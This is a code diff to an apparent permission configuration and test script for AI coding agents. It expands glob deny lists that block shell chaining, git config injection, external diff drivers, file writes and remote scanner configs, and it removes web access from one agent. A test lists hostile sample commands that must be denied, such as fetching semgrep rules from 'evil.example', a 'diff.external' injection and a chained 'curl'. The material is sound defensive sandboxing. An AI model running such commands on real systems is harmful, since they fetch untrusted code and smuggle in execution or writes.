@@ -229,21 +229,36 @@ REVIEW_VERIFY = [
     "git -C * status *", "git -C * log *", "git -C * show *",
     "git -C * diff *", "git -C * rev-parse *", "git -C * ls-files *",
 ]
-REVIEW_CONTROL_DENY = ["go test *-exec*", "go vet *-vettool*", "cargo clippy *--fix*",
-                       "cargo test *--config*", "*;*", "*&&*", "*&*", "*||*", "*|*", "*`*", "*$(*", "*>*", "*<*",
-                       "*\n*", "*\r*", "*=(*", "*--textconv*", "*--show-signature*",
-                       "git -C * -c *", "git -c *", "*--output*", "*--ext-diff*",
-                       "*eslint *--fix*", "*eslint *--output-file*",
-                       "*jest *-u*", "*jest *--updateSnapshot*",
-                       "*vitest *-u*", "*vitest *--update*",
-                       "*playwright test *--update-snapshots*",
-                       "*tsc *--outFile*", "*tsc *--outDir*",
-                       "python3 -m pytest /*", "python3 -m pytest ../*", "*--junitxml*",
-                       "go test *-toolexec*", "cargo test *--manifest-path*"]
-SECURITY_EXTRA_DENY = ["git -C * -c *", "git -c *", "*--output*", "*--ext-diff*",
-                       "*--report-path*", "npm audit fix", "npm audit fix *",
-                       "semgrep *--config=https*", "semgrep *--config=http*",
-                       "semgrep *-o *", "trivy *-o *", "gitleaks *-o *"]
+REVIEW_CONTROL_DENY = [
+    "go test *-exec*", "go vet *-vettool*", "cargo clippy *--fix*", "cargo test *--config*",
+    "*;*", "*&&*", "*&*", "*||*", "*|*", "*`*", "*$(*", "*>*", "*<*",
+    "*\n*", "*\r*", "*=(*", "*--textconv*", "*--show-signature*",
+    "git -C * -c *", "git -c *", "*--output*", "*--ext-diff*",
+    "*eslint *--fix*", "*eslint *--output-file*",
+    "*jest * -u", "*jest * -u *", "*jest -u", "*jest -u *", "*jest *--updateSnapshot*",
+    "*vitest * -u", "*vitest * -u *", "*vitest -u", "*vitest -u *", "*vitest *--update*",
+    "*playwright test *--update-snapshots*",
+    "*tsc *--outFile*", "*tsc *--outDir*",
+    "python3 -m pytest /*", "python3 -m pytest ../*", "*--junitxml*",
+    "go test *-toolexec*", "cargo test *--manifest-path*",
+    "*--fix*", "* -o*", "*trivy plugin *", "*--generate-default-config*",
+    "* -o *", "* -o/*", "* -o=*", "*--coverprofile*", "*--junit-xml*",
+    "*--config-env*", "*--exec-path*",
+    'git *--out*"*', "git *--out*'*", 'git *--ext-*"*', "git *--ext-*'*",
+    'git *"-c"*', "git *'-c'*", r"git *\*",
+]
+SECURITY_EXTRA_DENY = [
+    "git -C * -c *", "git -c *", "*--output*", "*--ext-diff*", "*--report-path*",
+    "npm audit fix", "npm audit fix *",
+    "semgrep *--config=https*", "semgrep *--config=http*", "semgrep *-o *",
+    "semgrep *--config *http*", "semgrep *-f *http*",
+    "trivy *-o *", "gitleaks *-o *",
+    "*--fix*", "* -o*", "*trivy plugin *", "*--generate-default-config*",
+    "* -o *", "* -o/*", "* -o=*", "*--coverprofile*", "*--junit-xml*",
+    "*--config-env*", "*--exec-path*",
+    'git *--out*"*', "git *--out*'*", 'git *--ext-*"*', "git *--ext-*'*",
+    'git *"-c"*', "git *'-c'*", r"git *\*",
+]
 SECURITY_CONTROL_DENY = ["*;*", "*&&*", "*&*", "*||*", "*|*", "*`*", "*$(*", "*>*", "*<*",
                          "*\n*", "*\r*", "*=(*", "*--textconv*", "*--show-signature*"]
 
@@ -289,7 +304,8 @@ FIXTURE_DELTAS = {  # 2026-10-10: read-only agents get read-only git in OpenCode
                                     "git -C * diff *", "git -C * rev-parse *", "git -C * ls-files *")
                              + no_git_writes("diff", "log", "show")
                              + denies(*SECURITY_EXTRA_DENY)
-                             + denies(*SECURITY_CONTROL_DENY)},
+                             + denies(*SECURITY_CONTROL_DENY),
+                 "set": {"webfetch": "deny", "websearch": "deny"}},
     "tester": {"set": {"webfetch": "allow", "websearch": "allow"}},
     "researcher": {"bash_remove": ["git *"],
                    "bash_add": allows("git status *", "git rev-parse *", "git log *", "git show *",
@@ -424,8 +440,11 @@ check("reviewer prompt carries the semantic contract",
           ["Mandatory semantic passes", "coverage table", "head SHA"]))
 check("tester prompt carries data provenance and copy truth",
       all(x in by_name["tester"].body for x in ["data provenance", "copy truth"]))
-check("lead work order carries cardinality and copy truth",
-      all(x in by_name["lead"].body for x in ["cardinality map", "copy map"]))
+check("lead work order carries cardinality, copy truth and optional fields",
+      all(x in by_name["lead"].body for x in ["cardinality map", "copy map", "optional-field"]))
+check("builder contract carries optional fields", "Optional fields" in by_name["builder"].body)
+check("work-order skill carries optional fields",
+      "Optional fields" in next(s for s in src.skills if s.name == "work-order").body)
 check("testing skill carries data provenance and copy truth",
       all(x in next(s for s in src.skills if s.name == "testing").body
           for x in ["data provenance", "copy truth"]))
@@ -624,7 +643,13 @@ SECURITY_DENY = ["semgrep --config=auto . ; git push", "gitleaks detect ; curl h
                  "git -C /tmp diff --output=/tmp/x",
                  "git -C /tmp -c diff.external=id diff",
                  "semgrep --config=https://evil.example .",
-                 "trivy fs -o /tmp/x .",
+                 "semgrep --config=auto --fix .",
+                 "semgrep --config https://evil.example .",
+                 "semgrep -f https://evil.example .",
+                 "pip-audit --fix",
+                 "pip-audit -o src/app.py",
+                 "trivy plugin install",
+                 "trivy fs -o/tmp/x .",
                  "gitleaks detect -o /tmp/x"]
 leaked = [f"security: {c}" for c in SECURITY_DENY if oc_bash(by_name["security"], c) == "allow"]
 check("security cannot chain or write through the expanded scanner access", not leaked, leaked)
